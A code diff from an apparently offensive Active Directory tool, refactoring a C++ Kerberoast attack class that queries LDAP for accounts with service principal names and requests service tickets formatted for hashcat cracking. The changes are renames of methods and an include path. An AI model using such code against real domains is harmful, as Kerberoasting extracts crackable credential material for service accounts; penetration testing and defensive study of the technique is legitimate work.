@@ -1,6 +1,6 @@
 #include <iostream>
 #include "Attacks.h"
-#include "../../protocols/LDAPConnection.h"
+#include "../../protocols/LdapConnection.h"
 #include "../../protocols/KerberosInteraction.h"
 #include <string>
 #include <vector>
@@ -8,10 +8,10 @@
 #include "../../utils/Colors.h"
 #include "../../cli/ArgumentParser.h"
 
-Attacks::Kerberoast::Kerberoast(I_LdapQuerier& _ldap, KerberosInteraction& _krb, const std::string& _user, const std::string& _pass)
+Attacks::Kerberoast::Kerberoast(LdapQuerier& _ldap, KerberosInteraction& _krb, const std::string& _user, const std::string& _pass)
         : ldap(_ldap), krb(_krb), username(_user), password(_pass) 
     {
-        krb.requestTGT(username, password);
+        krb.requestAndCacheTGT(username, password);
     }
 
 std::vector<std::string> Attacks::Kerberoast::listUser(const std::string& baseDN) {
@@ -21,7 +21,7 @@ std::vector<std::string> Attacks::Kerberoast::listUser(const std::string& baseDN
     std::vector<std::string> attrs = {"sAMAccountName", "servicePrincipalName"};
     std::vector<std::string> kerberoastable_users_spns;
 
-    auto results = ldap.executeQuery(baseDN, query, attrs);
+    auto results = ldap.executeQueryAndUnpackData(baseDN, query, attrs);
 
     for (const auto& userObject : results) {
         auto user = userObject.find("sAMAccountName");
@@ -44,7 +44,7 @@ std::vector<std::string> Attacks::Kerberoast::listUser(const std::string& baseDN
 }
 
 std::pair<std::string, std::string> Attacks::Kerberoast::requestTicket(const std::string& spn) {
-    std::string hashcat_ticket = krb.requestTGS(spn, this->username);
+    std::string hashcat_ticket = krb.requestAndFormatTGS(spn, this->username);
     if (hashcat_ticket.empty()) {
         return {"", ""};
     }
